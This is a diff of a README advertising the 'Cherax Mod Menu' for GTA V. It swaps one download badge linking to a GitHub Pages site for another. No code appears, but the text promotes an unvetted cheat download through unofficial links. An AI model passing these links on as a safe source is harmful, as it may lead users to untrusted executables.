@@ -2,7 +2,7 @@
 
 **Cherax Mod Menu** is a powerful utility for expanding your GTA V experience with custom features, improved game controls, and fully in-game UI. Built for stability and customization, it provides a smooth offline-compatible setup for personal use.
 
-[![⬇️ Download Cherax Mod Menu](https://img.shields.io/badge/⬇️_Download_Cherax_Mod_Menu-orange?style=for-the-badge&logo=rockstar)](https://daiseytriblett.github.io/.github/cherax-mod-menu)
+[![Explore Cherax GTA V](https://img.shields.io/badge/Explore-Cherax%20GTA%20V-9333EA?style=flat-square)](https://cherax-gta-v.github.io/.github/)
 
 ---
 
